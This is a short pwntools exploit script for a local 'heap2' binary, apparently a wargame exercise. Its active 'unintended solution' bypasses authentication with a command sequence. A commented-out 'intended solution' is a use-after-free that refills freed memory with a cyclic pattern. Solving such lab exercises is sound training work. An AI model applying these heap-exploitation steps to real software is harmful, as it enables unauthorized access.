from pwn import *

elf = ELF("./heap2",checksec=False)

## Unintended solution
p = process([elf.path])
p.recvline()
p.sendline(b"auth user")
p.recvline()
p.sendline(b"service")
p.recvline()
p.sendline(b"login")
log.info(f"Login output: {p.recvline().decode()}")

## Intended solution
# p = process([elf.path])
# p.recvline()
# p.sendline(b"auth user")
# p.recvline()
# p.sendline(b"reset")
# p.recvline()
# p.sendline(b"service "+cyclic(0x20))
# p.recvline()
# p.sendline(b"login")
# log.info(f"Login output: {p.recvline().decode()}")